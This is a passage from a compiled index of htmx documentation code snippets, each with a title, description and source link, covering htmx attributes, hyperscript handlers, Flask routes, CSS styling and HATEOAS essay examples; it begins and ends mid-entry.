https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/locality-of-behaviour.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<button id=\"d1\">Click Me</button>\n```\n\n----------------------------------------\n\nTITLE: JSON Response Example\nDESCRIPTION: This JSON snippet illustrates a 'RESTless' API response for a bank account.  The client needs prior knowledge about the API structure to interpret the `status` field and determine available actions.  It relies on out-of-band information (e.g., API documentation) and violates the uniform interface constraint of REST.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/how-did-rest-come-to-mean-the-opposite-of-rest.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nHTTP/1.1 200 OK\n\n{\n    \"account_number\": 12345,\n    \"balance\": {\n        \"currency\": \"usd\",\n        \"value\": 100.00\n     },\n     \"status\": \"good\"\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Carnival Ride Table (HTML)\nDESCRIPTION: This HTML snippet displays a simple table representing carnival ride sign-ups. It shows names and their preferences for Carousel and Roller Coaster rides using basic HTML table elements. The closing tags are omitted for clarity as stated in the original text.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/webcomponents-work-great.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<table>\n  <tr><th>Name    <th>Carousel  <th>Roller Coaster\n  <tr><td>Alex    <td>Yes       <td>No\n  <tr><td>Sophia  <td>Yes       <td>Yes\n</table>\n```\n\n----------------------------------------\n\nTITLE: Filtering Extensions with Alpine.js\nDESCRIPTION: This code snippet implements a search filter for a table of HTMX extensions. It uses Alpine.js-like syntax within the _=\"...\" attribute to handle user input and dynamically show/hide table rows based on whether their text content matches the search term. It also manages the visibility of section headers and maintains a constant page size by adjusting the table's bottom margin.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/_index.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<search aria-label=\"Community extensions\">\n  <label for=\"extension-filter\" hidden>Search Extensions:</label>\n  <input type=\"search\" id=\"extension-filter\" placeholder=\"Search Extensions...\"\n       _=\"init\n            set :table to the next <table/>\n            set :initialHeight to *computed-height of :table\n          on keyup\n            if the event's key is 'Escape' then set my value to '' then trigger input end\n          on input\n            repeat in closest <tr/> to <td:first-of-type/> in :table\n              if its textContent.toLowerCase() contains my value.toLowerCase()\n                remove @hidden from it\n              else\n                add @hidden='' to it\n              end\n            end\n            -- hide section header when its section is empty\n            show closest <tr/> to <tbody th/> in :table\n                 when (the next <tr:not([hidden])/> from it within the closest <tbody/> to it) exists\n            -- avoid shift by keeping page size constant\n            set *margin-bottom of :table to\n                `calc(${:initialHeight} - ${*computed-height of :table})`\">\n</search>\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Adding Classes to Body based on URL Parameters\nDESCRIPTION: This JavaScript code checks the URL's query parameters and adds specific classes ('lmao', 'kawaii', 'ads') to the `<body>` element based on these parameters. This allows dynamic styling and behavior changes triggered by URL flags like '?wuw=true', '?uwu=true', or '?ads=true'.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/_index.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nif(window.location.search==\"?wuw=true\" || window.location.search==\"?suw=true\") {\n  document.body.classList.add(\"lmao\")\n}\nif(window.location.search==\"?uwu=true\") {\n  document.body.classList.add(\"kawaii\")\n}\nif(window.location.search==\"?ads=true\") {\n  document.body.classList.add(\"ads\")\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Contacts with Flask and Python\nDESCRIPTION: This Python code snippet demonstrates a Flask controller method for displaying a paginated list of contacts as an HTML page. It retrieves the page number from the request arguments, fetches the contacts using the `Contact` model, and renders the `index.html` template with the retrieved contacts. The snippet depends on the Flask framework and a `Contact` model.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/mvc.md#_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\n@app.route(\"/contacts\")\ndef contacts():\n    contacts = Contact.all(page=request.args.get('page', default=0, type=int))\n    return render_template(\"index.html\", contacts=contacts)\n```\n\n----------------------------------------\n\nTITLE: CSS Styling for Displaying Elements Based on Body Class\nDESCRIPTION: These CSS styles control the visibility of different elements on the page based on the presence of specific classes (lmao, kawaii, ads) on the body element. It hides/shows different sections of the dark-hero div and manages the display of advertisement sections.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/_index.md#_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\n.wuw {\n  display:none;\n}\n.uwu {\n  display:none;\n}\nbody.lmao .dark-hero .main {\n    display:none;\n}\nbody.lmao .dark-hero .wuw {\n    display:block;\n    padding-top: 24px;\n}\nbody.lmao .dark-hero .uwu {\n    display:none;\n}\nbody.kawaii .dark-hero .main {\n    display:none;\n}\nbody.kawaii .dark-hero .wuw {\n    display:none;\n}\nbody.kawaii .dark-hero .uwu {\n    display:block;\n    padding-top: 24px;\n}\n\nbody.ads .ad {\n  display: block;\n  text-align: center;\n  margin-left: calc(50% - 50vw);\n  margin-right: calc(50% - 50vw);\n}\n\nbody.ads .ad a:hover {\n  opacity: 100%;\n}\n\nbody .ad {\n  display: none;\n}\n\nbody.ads .ad img {\n  max-width: 90vw;\n}\n\n```\n\n----------------------------------------\n\nTITLE: SQLite: sqlite3CodeRhsOfIn() Function Analysis (C)\nDESCRIPTION: This C function from SQLite handles the right-hand side of an IN operator in SQL queries. It's a large function (>200 LOC) within a codebase known for its quality and maintainability.  The function demonstrates that large functions can exist in successful, complex software.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/codin-dirty.md#_snippet_1\n\nLANGUAGE: c\nCODE:\n```\nRefer to: https://github.com/sqlite/sqlite/blob/70989b6f5923a732b0caee881bd7c3ff8859e9c5/src/expr.c#L3502\n```\n\n----------------------------------------\n\nTITLE: Custom Validation with htmx:validation:validate in HTML\nDESCRIPTION: This HTML snippet demonstrates how to use the `htmx:validation:validate` event and Alpine.js (indicated by the `_` attribute) to perform custom validation on an input field within a form. It checks if the input value is 'foo' and sets a custom validity message if it's not, otherwise clears the message.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/events.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<form hx-post=\"/test\">\n  <input _=\"on htmx:validation:validate\n               if my.value != 'foo'\n                  call me.setCustomValidity('Please enter the value foo')\n               else\n                  call me.setCustomValidity('')\"\n         name=\"example\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Simulating Server-Side Routes with HTMX Test Helpers\nDESCRIPTION: This JavaScript code uses HTMX test helpers to simulate server-side routes. It defines a route for \"/init\" that returns an HTML button and a route for \"/doit\" that returns the string \"Did it!\".  This allows the demo to function without a real server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/keyboard-shortcuts.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n<script>\n\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // routes\n    init(\"/init\", function(request, params){\n        return \"<button class='btn primary' style='font-size:20pt' hx-trigger='click, keyup[altKey&&shiftKey&&key==\\\"D\\\"] from:body'\" +\n                      \" hx-post='/doit'>Do It! (alt-shift-D) </button>\";\n    });\n\n    onPost(\"/doit\", function (request, params) {\n        return \"Did it!\";\n    });\n\n</script>\n```\n\n----------------------------------------\n\nTITLE: Installing response-targets via npm\nDESCRIPTION: This snippet demonstrates how to install the response-targets extension using npm and import it into your JavaScript project. It highlights the use of a bundler (e.g., Webpack, Rollup) to combine the extension with the htmx core library.  This approach requires Node.js and npm installed.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/response-targets.md#_snippet_1\n\nLANGUAGE: JS\nCODE:\n```\nimport `htmx.org`;\nimport `htmx-ext-response-targets`; \n```\n\n----------------------------------------\n\nTITLE: Updating Progress Bar with htmx Events in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to use htmx events to update a progress bar during AJAX file uploads.  It listens for the `htmx:xhr:progress` event on a form and updates the `value` attribute of the element with the ID `progress` based on the loaded and total bytes. Requires htmx library to be included.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/CHANGELOG.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.on('#form', 'htmx:xhr:progress', function(evt) {\n  htmx.find('#progress').setAttribute('value', evt.detail.loaded/evt.detail.total * 100)\n});\n```\n\n----------------------------------------\n\nTITLE: HTML Form for Depositing Funds\nDESCRIPTION: This HTML snippet demonstrates a form for depositing funds into a bank account. It includes the form's method (POST), action URL, an input field for the amount, and a submit button.  This example shows how HTML can inherently represent hypermedia controls, eliminating the need for external documentation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hateoas.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <body>\n    <form method=\"post\" action=\"/accounts/12345/deposits\">\n        <input name=\"amount\" type=\"number\" />\n        <button>Submit</button>\n    </form>\n  <body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: IntelliJ: CompileAction.update() Function Analysis (Java)\nDESCRIPTION: This Java function, part of the `CompileAction` class in IntelliJ, updates the compilation process. It has approximately 90 lines of code, showing that large functions are present even in object-oriented languages, contrasting 'Clean Code' recommendations.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/codin-dirty.md#_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nRefer to: https://github.com/JetBrains/intellij-community/blob/8c6cc1579ac358451ba2c5b8a54853249fdc5451/java/compiler/impl/src/com/intellij/compiler/actions/CompileAction.java#L60\n```\n\n----------------------------------------\n\nTITLE: Selecting Content with hx-select\nDESCRIPTION: This snippet demonstrates how to select a specific part of the response to be used in the swap using htmx's `hx-select`. Selects content from the response based on a CSS selector. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_16\n\nLANGUAGE: html\nCODE:\n```\nhx-select\n```\n\n----------------------------------------\n\nTITLE: JavaScript Handler - Fade Out Demo\nDESCRIPTION: This JavaScript code defines a handler for the `/fade_out_demo` endpoint. It simply returns an empty string, effectively deleting the element that triggered the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nonDelete(\"/fade_out_demo\", function () {return \"\"});\n```\n\n----------------------------------------\n\nTITLE: Importing htmx WebSockets extension in JavaScript\nDESCRIPTION: This snippet demonstrates how to import the `htmx.org` and `htmx-ext-ws` packages into your JavaScript file when using a bundler.  This is necessary after installing the packages via npm. Ensure your build process correctly bundles these modules.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/ws.md#_snippet_2\n\nLANGUAGE: JS\nCODE:\n```\nimport `htmx.org`;\nimport `htmx-ext-ws`; \n```\n\n----------------------------------------\n\nTITLE: Creating a Graph Endpoint with Flask\nDESCRIPTION: This code snippet defines a new endpoint `/graph` using the Flask framework. It calls the `Contact.computeGraphInfo` method to retrieve graph data, passing a page number from the request arguments. The retrieved data is then rendered using the `graph.html` template.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/mvc.md#_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n@app.route(\"/graph\")\ndef graph():\n    graphInfo = Contact.computeGraphInfo(page=request.args.get('page', default=0, type=int))\n    return render_template(\"graph.html\", info=graphInfo)\n```\n\n----------------------------------------\n\nTITLE: Handling Iframe Visibility with htmx\nDESCRIPTION: This HTML snippet demonstrates how htmx can be used to apply transition effects to an image based on events triggered within the webring. The opacity of the image is adjusted using htmx transitions when a `.nav-link` is clicked or when the iframe content is loaded.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/webring.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<img src=\"/img/navigator.gif\"\n        _=\"on click from .nav-link\n              log 'here'\n              transition my opacity to 100%\n            on load from #webring\n              transition my opacity to 0%\" style=\"opacity: 0; float: right; width: 38px; position:absolute; right:2px; bottom: 2px\">\n```\n\n----------------------------------------\n\nTITLE: HTML Response with Limited Actions (Overdrawn)\nDESCRIPTION: This snippet demonstrates an HTML response when the account is overdrawn. Only the deposit link is provided, showcasing how the available actions change based on the account's state, reflecting the \"Engine of Application State\" aspect of HATEOAS.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hateoas.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.1 200 OK\n\n<html>\n  <body>\n    <div>Account number: 12345</div>\n    <div>Balance: -$50.00 USD</div>\n    <div>Links:\n        <a href=\"/accounts/12345/deposits\">deposits</a>\n    </div>\n  <body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Adding Class with Hyperscript in htmx\nDESCRIPTION: This snippet demonstrates how to add a CSS class to an element on a click event using hyperscript within an htmx context.  Hyperscript is used as a replacement for some Intercooler attributes that don't have a direct htmx equivalent. It depends on hyperscript library being included in the project.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button _=\"on click add .clicked\">Add The \"clicked\" Class To Me</button>\n```\n\n----------------------------------------\n\nTITLE: Triggering an HX-GET Request on a Custom Event with hx-trigger\nDESCRIPTION: This HTML snippet showcases how to trigger an hx-get request using the `hx-trigger` attribute based on a custom event. Since the event bubbles up to the `<body>`, the `from:body` modifier is used. When `myEvent` is triggered on the body, an htmx GET request is sent to `/example`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-trigger.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!-- Since it bubbles up to the <body>, we must use the `from:body` modifier below -->\n<div hx-trigger=\"myEvent from:body\" hx-get=\"/example\"></div>\n```\n\n----------------------------------------\n\nTITLE: Rendering Template Fragment in Java\nDESCRIPTION: This Java snippet shows how to render only the `archive-ui` fragment of the `/contacts/detail.html` template using `ChillTemplates`. It retrieves a contact and then renders the template, specifying the fragment using the `#archive-ui` suffix. This is useful for updating only the archive button portion of the page, typically in response to an HTMX request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/template-fragments.md#_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nContact c = getContact();\n  ChillTemplates.render(\"/contacts/detail.html#archive-ui\", \"contact\", c);\n```\n\n----------------------------------------\n\nTITLE: Configuring hx-request with JSON\nDESCRIPTION: This HTML snippet demonstrates how to configure the `hx-request` attribute using a JSON-like syntax to set the request timeout to 100 milliseconds. The hx-request attribute is used to configure various aspects of the request, and the timeout parameter specifies the maximum time allowed for the request to complete.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-request.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div ... hx-request='{\"timeout\":100}'>\n  ...\n</div>\n```\n\n----------------------------------------\n\nTITLE: Accessing Event Object in hx-vals with JavaScript\nDESCRIPTION: This example demonstrates how to access the `event` object within the JavaScript expression in the hx-vals attribute. On each 'keyup' event, the value of the last typed key (`event.key`) is assigned to the 'lastKey' parameter and sent in the GET request to '/example'.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-vals.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-get=\"/example\" hx-trigger=\"keyup\" hx-vals='js:{lastKey: event.key}'>\n    <input type=\"text\" />\n  </div>\n```\n\n----------------------------------------\n\nTITLE: Serving htmx Website with Zola\nDESCRIPTION: This snippet demonstrates how to serve the htmx.org website locally using the Zola static site generator. It assumes Zola is already installed.  First, it changes the current directory to 'www', which contains the Zola project. Then, it uses the 'zola serve' command to start the local development server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/README.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncd www\nzola serve\n```\n\n----------------------------------------\n\nTITLE: Using Spread Operator in hx-vals with JavaScript\nDESCRIPTION: This example shows how to use the spread operator (`...`) within the JavaScript expression in the hx-vals attribute. The properties of the object returned by the `foo()` function are included as parameters in the GET request to '/example'. Requires `foo()` to be a defined function that returns an object.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-vals.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-get=\"/example\" hx-vals='js:{...foo()}'>Get Some HTML, Including All Values from foo() in the Request</div>\n```\n\n----------------------------------------\n\nTITLE: Defining a Web Component with JavaScript\nDESCRIPTION: This JavaScript snippet defines a custom HTML element, `edit-cell`, using the `HTMLElement` class and the `customElements.define` method. The component creates a dropdown select element with \"Yes\", \"No\", and \"Maybe\" options. The `connectedCallback` method is used to initialize the component's HTML based on attributes passed to it. The component requires no external dependencies, relying only on native JavaScript and HTML.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/webcomponents-work-great.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass EditCell extends HTMLElement {\n  connectedCallback() {\n    this.value = this.getAttribute(\"value\")\n    this.name = this.getAttribute(\"name\")\n\n    this.innerHTML = `\n      <select>\n        <option ${this.value === 'Yes' ? 'selected' : ''}>Yes\n        <option ${this.value === 'No' ? 'selected' : ''}>No\n        <option ${this.value === 'Maybe' ? 'selected' : ''}>Maybe\n      </select>\n    `\n  }\n}\n\ncustomElements.define('edit-cell', EditCell)\n```\n\n----------------------------------------\n\nTITLE: Enabling and Ignoring htmx Extension\nDESCRIPTION: Demonstrates how to enable an htmx extension for a specific part of the DOM tree and how to ignore it in a nested element. The `hx-ext` attribute enables the `example` extension in the outer div, but it is ignored in the inner div using `hx-ext=\"ignore:example\"`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-ext.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"example\">\n  \"Example\" extension is used in this part of the tree...\n  <div hx-ext=\"ignore:example\">\n    ... but it will not be used in this part.\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Simulating Server-Side Behavior - JavaScript\nDESCRIPTION: This JavaScript code simulates server-side behavior by defining routes and handling the /submit endpoint. The onPost function retrieves the user input from the HX-Prompt header and uses it to generate a response.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/dialogs.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n<script>\n\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // routes\n    init(\"/demo\", function(request, params){\n      return submitButton();\n    });\n\n    onPost(\"/submit\", function(request, params){\n        var response = request.requestHeaders['HX-Prompt'];\n        return promptSubmit(response);\n    });\n\n    // templates\n    function submitButton() {\n      return `<div>\n  <button class=\"btn primary\"\n          hx-post=\"/submit\"\n          hx-prompt=\"Enter a string\"\n          hx-confirm=\"Are you sure?\"\n          hx-target=\"#response\">\n    Prompt Submission\n  </button>\n  <div id=\"response\"></div>\n</div>`;\n    }\n\n    function promptSubmit(response) {\n        return `User entered <i>${response}</i>`;\n    }\n</script>\n```\n\n----------------------------------------\n\nTITLE: Resulting head tag after merging\nDESCRIPTION: This is an example HTML snippet demonstrating the resulting `<head>` section after the `head-support` extension has merged the new content with the original `<head>`.  It shows which tags were kept, removed, and added.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n<link rel=\"stylesheet\" href=\"https://the.missing.style\">\n<script src=\"/js/script2.js\"></script>\n<link rel=\"stylesheet\" href=\"/css/site2.css\">\n<script src=\"/js/script3.js\"></script>\n</head>\n```\n\n----------------------------------------\n\nTITLE: HTML Including Form Values in GET Requests\nDESCRIPTION: Demonstrates how to include form values in `GET` requests triggered by non-form elements in htmx using the `hx-include` attribute. This allows to send data from the enclosing form, when the triggering element is not itself within a form and issues a GET request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"/search\"\n        hx-include=\"closest form\">\n  Search\n</button>\n```\n\n----------------------------------------\n\nTITLE: HTML with hx-boost for Form Submission\nDESCRIPTION: This HTML snippet enhances the form submission with htmx's `hx-boost` attribute, which enables AJAX-style form submissions. This improves the user experience by preventing a full page reload when submitting the form.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <form action='/contacts' method=\"post\" hx-boost=\"true\">\n      <!-- form for adding contacts -->\n    </form>\n    <table hx-trigger=\"every 30s\" hx-get=\"/contacts/table\" hx-swap=\"outerHTML\">\n      <!-- contacts table -->\n    </table>\n</div>\n```\n\n----------------------------------------\n\nTITLE: HTML Form with hx-post for progressive enhancement\nDESCRIPTION: Demonstrates how to use a form element with `hx-post` to achieve progressive enhancement. JavaScript-enabled clients will get active search UX, while non-JavaScript enabled clients can still search by hitting enter.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_35\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/search\" method=\"POST\">\n    <input class=\"form-control\" type=\"search\"\n        name=\"search\" placeholder=\"Begin typing to search users...\"\n        hx-post=\"/search\"\n        hx-trigger=\"keyup changed delay:500ms, search\"\n        hx-target=\"#search-results\"\n        hx-indicator=\".htmx-indicator\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Filtering Events with Global Function - HTML\nDESCRIPTION: This code snippet uses a global Javascript function `checkGlobalState()` to filter a click event. The AJAX request to `/clicked` will only be triggered if `checkGlobalState()` returns `true`.  This requires the function to be defined in the global scope before the click event occurs.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/clicked\" hx-trigger=\"click[checkGlobalState()]\">Control Click Me</div>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Logic for htmx Demo\nDESCRIPTION: This JavaScript code simulates server-side logic for the htmx demo. It sets up routes using the init and onGet functions, which are assumed to be part of a testing framework. The onGet function returns an HTML snippet containing the loaded image. The server.autoRespondAfter delays the response to simulate a longer loading time.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/lazy-load.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nserver.autoRespondAfter = 2000; // longer response for more drama\n\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // routes\n    init(\"/demo\", function(request, params){\n      return lazyTemplate();\n    });\n\n    onGet(\"/graph\", function(request, params){\n      return \"<img alt='Tokyo Climate' src='/img/tokyo.png'>\";\n    });\n\n    // templates\n    function lazyTemplate(page) {\n      return `<div hx-get=\"/graph\" hx-trigger=\"load\">\n  <img alt=\"Result loading...\" class=\"htmx-indicator\" width=\"150\" src=\"/img/bars.svg\"/>\n</div>`;\n    }\n```\n\n----------------------------------------\n\nTITLE: Modal CSS Styling\nDESCRIPTION: This CSS code provides the styling for the modal dialog, including positioning, sizing, background color, and animations for opening and closing. It defines the appearance of the modal overlay and the content area, using keyframes for fade and zoom effects.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-custom.md#_snippet_2\n\nLANGUAGE: CSS\nCODE:\n```\n/***** MODAL DIALOG ****/\n#modal {\n\t/* Underlay covers entire screen. */\n\tposition: fixed;\n\ttop:0px;\n\tbottom: 0px;\n\tleft:0px;\n\tright:0px;\n\tbackground-color:rgba(0,0,0,0.5);\n\tz-index:1000;\n\n\t/* Flexbox centers the .modal-content vertically and horizontally */\n\tdisplay:flex;\n\tflex-direction:column;\n\talign-items:center;\n\n\t/* Animate when opening */\tanimation-name: fadeIn;\n\tanimation-duration:150ms;\n\tanimation-timing-function: ease;\n}\n\n#modal > .modal-underlay {\n\t/* underlay takes up the entire viewport. This is only\n\trequired if you want to click to dismiss the popup */\n\tposition: absolute;\n\tz-index: -1;\n\ttop:0px;\n\tbottom:0px;\n\tleft: 0px;\n\tright: 0px;\n}\n\n#modal > .modal-content {\n\t/* Position visible dialog near the top of the window */\n\tmargin-top:10vh;\n\n\t/* Sizing for visible dialog */\n\twidth:80%;\n\tmax-width:600px;\n\n\t/* Display properties for visible dialog*/\n\tborder:solid 1px #999;\n\tborder-radius:8px;\n\tbox-shadow: 0px 0px 20px 0px rgba(0,0,0,0.3);\n\tbackground-color:white;\n\tpadding:20px;\n\n\t/* Animate when opening */\n\tanimation-name:zoomIn;\n\tanimation-duration:150ms;\n\tanimation-timing-function: ease;\n}\n\n#modal.closing {\n\t/* Animate when closing */\n\tanimation-name: fadeOut;\n\tanimation-duration:150ms;\n\tanimation-timing-function: ease;\n}\n\n#modal.closing > .modal-content {\n\t/* Animate when closing */\n\tanimation-name: zoomOut;\n\tanimation-duration:150ms;\n\tanimation-timing-function: ease;\n}\n\n@keyframes fadeIn {\n\t0% {opacity: 0;}\n\t100% {opacity: 1;}\n}\n\n@keyframes fadeOut {\n\t0% {opacity: 1;}\n\t100% {opacity: 0;}\n}\n\n@keyframes zoomIn {\n\t0% {transform: scale(0.9);}\n\t100% {transform: scale(1);}\n}\n\n@keyframes zoomOut {\n\t0% {transform: scale(1);}\n\t100% {transform: scale(0.9);}\n}\n```\n\n----------------------------------------\n\nTITLE: Including htmx Script in HTML\nDESCRIPTION: This HTML snippet includes the htmx library in a web page by referencing the downloaded JavaScript file.  The <script> tag specifies the path to the htmx file within the project's directory structure. This assumes that the file has already been downloaded to the specified location.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/vendoring.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"/js/vendor/htmx-2.0.4.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Example HTTP Request with Cookie Header (HTTP)\nDESCRIPTION: This example showcases an HTTP request including a `Cookie` header. The browser automatically adds this header to requests made to the same domain, allowing the server to maintain user sessions. The `token` value is used for authentication.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_10\n\nLANGUAGE: HTTP\nCODE:\n```\nGET /users HTTP/1.1\nHost: yourdomain.com\nCookie: token=asd8234nsdfp982\n```\n\n----------------------------------------\n\nTITLE: Styling Silver Sponsors Display - CSS\nDESCRIPTION: This CSS snippet defines the style for the silver sponsors section, including text alignment, padding, image width, and minimum image width. It centers the content within the divs and sets the width of images.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/_index.md#_snippet_3\n\nLANGUAGE: css\nCODE:\n```\n#silver-sponsors div {\n  text-align: center;\n  padding: 12px;\n}\n#silver-sponsors div a * {\n    width: 80%;\n}\n#silver-sponsors img {\n    min-width: 150px;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating the link itself with hx-target=\"this\" in htmx (HTML)\nDESCRIPTION: This HTML snippet demonstrates how to use hx-target=\"this\" to target the link element itself for swapping. When the link is clicked, a POST request is sent to the '/new-link' URL, and the response replaces the link element using hx-swap=\"outerHTML\".\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-target.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<a hx-post=\"/new-link\" hx-target=\"this\" hx-swap=\"outerHTML\">New link</a>\n```\n\n----------------------------------------\n\nTITLE: Logging all htmx events\nDESCRIPTION: This JavaScript snippet enables logging of all events triggered by htmx. It calls the `htmx.logAll()` method, which will log every event that htmx triggers to the console, allowing developers to observe the library's internal operations and state changes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_43\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.logAll();\n```\n\n----------------------------------------\n\nTITLE: Basic Kutty POST Request\nDESCRIPTION: This HTML snippet demonstrates a basic POST request using Kutty.  When the div is clicked, an AJAX POST request is sent to the `/clicked` endpoint.  No external JavaScript dependencies are required. This example highlights Kutty's declarative approach to AJAX.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2020-5-15-kutty-0.0.1-is-released.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n  <div kt-post=\"/clicked\">Click Me!</div>\n```\n\n----------------------------------------\n\nTITLE: Removing Class with Hyperscript in htmx\nDESCRIPTION: This snippet demonstrates removing a CSS class from an element on a click event using hyperscript within an htmx context.  It uses the `remove` command to remove a class. It depends on hyperscript library being included in the project.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_15\n\nLANGUAGE: html\nCODE:\n```\n<button class=\"red\" _=\"on click remove .red\">Remove The \"red\" class from me</button>\n```\n\n----------------------------------------\n\nTITLE: CSS Styling for Toast Message\nDESCRIPTION: This CSS snippet styles a toast message element.  It defines the appearance of the toast when it is settling (appearing) and its default appearance, including a transition for opacity to create a fade-in/fade-out effect.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/bulk-update.md#_snippet_1\n\nLANGUAGE: CSS\nCODE:\n```\n#toast.htmx-settling {\n  opacity: 100;\n}\n\n#toast {\n  background: #E1F0DA;\n  opacity: 0;\n  transition: opacity 3s ease-out;\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Example: Contact Information with Actions\nDESCRIPTION: This HTML snippet demonstrates a basic contact information display with links to perform actions such as editing, emailing, and archiving.  It exemplifies the concept of hypermedia as the engine of application state (HATEOAS), where actions are discoverable through links embedded in the resource representation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/rest-explained.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <body>\n  <section>\n    <p>\n      Name: 